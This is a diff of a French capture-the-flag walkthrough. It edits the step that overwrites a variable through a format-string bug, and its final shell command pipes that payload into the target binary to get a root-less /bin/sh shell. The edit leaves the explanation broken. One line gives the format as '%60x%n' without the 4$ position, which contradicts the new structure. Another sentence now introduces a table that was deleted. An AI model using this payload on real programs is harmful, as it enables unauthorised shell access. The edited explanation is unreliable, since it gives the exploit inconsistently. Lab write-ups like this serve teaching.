@@ -153,36 +153,20 @@ argument** vu par `printf`. C'est là qu'on placera l'adresse de `m`.
 On veut **écrire 64 dans `m` (`0x804988c`)** avec `%n`. `%n` écrit le **nombre de
 caractères déjà affichés** à l'adresse fournie en argument.
 
-Structure : `[adresse de m][3 × %20x][%n]`
+Structure : `[adresse de m][%60x][%4$n]`
 
 - `\x8c\x98\x04\x08` → l'adresse de `m` (little-endian) ; **4 caractères
   affichés**, et c'est l'argument n°4.
-- `%20x%20x%20x` → affiche 3 mots de pile paddés sur 20 → `3 × 20 = 60`
-  caractères (positions 1, 2, 3).
-- `%n` → 4ᵉ conversion → écrit le compteur (`4 + 60 = 64`) à l'adresse en
-  position 4 = `m`.
+- `%60x` → affiche 60 caractères paddés.
+- `%4$n` → n écrit le compteur (`4 + 60 = 64`) à l'adresse en 4e position 4$ = `m`.
 
-Déroulement de `printf` sur le format `\x8c\x98\x04\x08%20x%20x%20x%n`, avec son
+Déroulement de `printf` sur le format `\x8c\x98\x04\x08%60x%n`, avec son
 compteur de caractères affichés :
-
-| Étape du format | Ce que fait `printf` | Car. affichés | Compteur |
-|---|---|---|---|
-| `\x8c\x98\x04\x08` | affiche les 4 octets de l'adresse | 4 | **4** |
-| `%20x` (arg 1) | affiche un mot de pile paddé sur 20 | 20 | **24** |
-| `%20x` (arg 2) | affiche un mot de pile paddé sur 20 | 20 | **44** |
-| `%20x` (arg 3) | affiche un mot de pile paddé sur 20 | 20 | **64** |
-| `%n` (arg 4) | **écrit** le compteur (64) à l'adresse en arg 4 = `m` | 0 | 64 |
-
-Au moment du `%n`, le compteur vaut **64** → `m` reçoit 64. Les `%20x`
-**comptent**, le `%n` **écrit**.
-
-⚠️ L'adresse contient des octets non imprimables (`8c`, `98`, `04`, `08`) : on ne
-peut pas la taper au clavier, il faut la générer (python, `printf`, perl…).
 
 ## 6. Exécuter et récupérer le flag
 
 ```sh
-(printf '\x8c\x98\x04\x08%%20x%%20x%%20x%%n'; cat) | ./level3
+(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
 ```
 
 Quand `m` vaut 64, le `cmp $0x40` réussit → `system("/bin/sh")`. Le `; cat`
